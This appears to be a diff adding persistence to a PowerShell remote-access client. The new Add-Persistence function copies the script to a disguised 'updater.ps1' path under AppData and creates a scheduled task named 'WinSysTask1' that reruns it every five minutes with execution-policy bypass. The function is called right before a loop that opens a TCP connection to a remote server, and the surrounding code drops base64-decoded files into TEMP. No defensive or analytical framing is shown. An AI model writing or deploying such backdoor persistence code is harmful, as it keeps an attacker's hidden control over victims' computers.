@@ -14,6 +14,20 @@ function Connect-ZiPo {
         }
     }
 
+    function Add-Persistence {
+    $script = $PSCommandPath
+    if (-not $script) {
+        $script = "$env:APPDATA\Microsoft\updater.ps1"
+    }
+
+    # Копируем скрипт в скрытую директорию
+    Copy-Item -Path $PSCommandPath -Destination $script -Force
+
+    # Создаём задачу
+    schtasks /Create /SC MINUTE /MO 5 /TN "WinSysTask1" /TR "powershell -ExecutionPolicy Bypass -File `"$script`"" /F | Out-Null
+}
+
+
     function Download-File($filename, $b64) {
         $out = "$env:TEMP\$filename"
         [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
@@ -150,6 +164,8 @@ function Connect-ZiPo {
         exit
     }
 
+
+    Add-Persistence
     while ($true) {
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
